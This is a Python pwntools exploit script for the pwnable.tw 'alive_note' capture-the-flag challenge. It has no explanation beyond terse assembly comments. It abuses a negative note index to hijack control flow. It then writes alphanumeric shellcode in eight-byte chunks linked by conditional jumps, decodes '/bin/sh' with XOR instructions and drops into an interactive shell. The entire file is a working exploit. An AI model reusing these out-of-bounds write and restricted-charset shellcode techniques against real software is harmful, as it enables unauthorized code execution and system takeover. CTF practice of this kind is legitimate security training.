from pwn import *
def add(index, name):
    global k
    k+=1
    print(k)
    s.recvuntil("choice :")
    s.send("1")
    s.recvuntil("Index :")
    s.send(str(index))
    s.recvuntil("Name :")
    if(len(name)==8):
        s.send(name)
    else:
        s.send(name+"\n")

def del_(index):
    s.recvuntil("choice :")
    s.send("3")
    s.recvuntil("Index :")
    s.send(str(index))

#s=remote("chall.pwnable.tw",10300)
s=process("./alive_note")
k=0

add(1,"a"*8)
add(-27,"\x71\x38") #jno
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x50\x59"+"\x43"*4+"\x71\x38") # #push eax, pop ecx, inc ebx*4
add(0,"09bin9sh")
add(3,"a"*8)
add(0,"49")
add(0,"\x43"*6+"\x71\x38")  #inc ebx*6
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x43"*6+"\x71\x38")  #inc ebx*6
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x43"*6+"\x71\x38")  #inc ebx*6
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x31\x59\x61"+"\x4e"*3+"\x71\x38") #xor [ecx+0x61],ebx :for /bin/sh
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x31\x59\x65"+"\x4e"*3+"\x71\x38") #  xor [ecx+0x65],ebx :for /bin/sh
for i in range(16):
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"\x41"*6+"\x71\x38") # inc ecx*6
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x41"+"\x51\x58"+"\x43"*3+"\x71\x38") #inc ecx, push ecx, pop eax, inc ebx*3
for i in range(4):
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"\x43"*6+"\x71\x38") # inc ebx*6
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x43"*5+"\x4e"+"\x71\x38") # inc ebx*5
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x31\x59\x20"+"\x4e"*3+"\x71\x38")  #xor [ecx+0x20],ebx
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x49\x31\x59\x20"+"\x4e"*2+"\x71\x38")  #dec ecx, xor [ecx+0x20],ebx
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x33\x49\x20\x41"+"\x4b"*2+"\x71\x38")  #xor  ecx, [ecx+0x20], dec ebx*2
for i in range(7):
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"\x4b"*6+"\x71\x38") # dec ebx*6
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x4b"*3+"\x31\x59\x77"+"\x71\x38") #  dec ebx*3, xor [ecx+0x77],ebx
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x6b\x51\x77\x61"+"\x4e"*2+"\x71\x38") # imul edx, [ecx+0x77], 0x61
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x31\x51\x77"+"\x4e"*3+"\x71\x38") # xor [ecx+0x77], edx
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x6b\x59\x77\x31"+"\x4b"*2+"\x71\x38") #imul ebx, [ecx+0x77],0x31, dec ebx
for i in range(7):
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"a"*8)
    add(0,"\x43"*6+"\x71\x38") #inc ebx*6
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x43"*5+"\x4e"+"\x71\x38")#inc ebx*5
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x4a"*6+"\x71\x38") # dex edx*6
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x4a\x31\x51\x77"+"\x4e"*2+"\x71\x38") #dex edx, xor [ecx+0x77],edx
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x31\x59\x77"+"\x4e"*3+"\x71\x38") #xor [ecx+0x77],ebx
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x50\x50\x50\x50\x50\x61"+"\x71\x38") #push eax*5, popa
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x6b\x73\x67\x20"+"\x46"*2+"\x71\x38") #imul esi, [ebx+0x67], 0x20
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x6b\x51\x68\x20"+"\x46"*2+"\x71\x38") #imul edx, [ecx+0x68], 0x20
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x6b\x49\x68\x20"+"\x46"*2+"\x71\x38") #imul ecx, [ecx+0x68], 0x20
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x46"*5+"\x56"+"\x71\x38")#inc esi, push esi
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x58"+"\x4e"*5+"\x71\x38")#pop eax
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x4e"*6+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x4e"*6+"\x71\x38")
add(0,"a"*8)
add(0,"a"*8)
add(0,"a"*8)
add(0,"\x78\x48"+"c"*6) #js
del_(1)
s.interactive()
s.close()
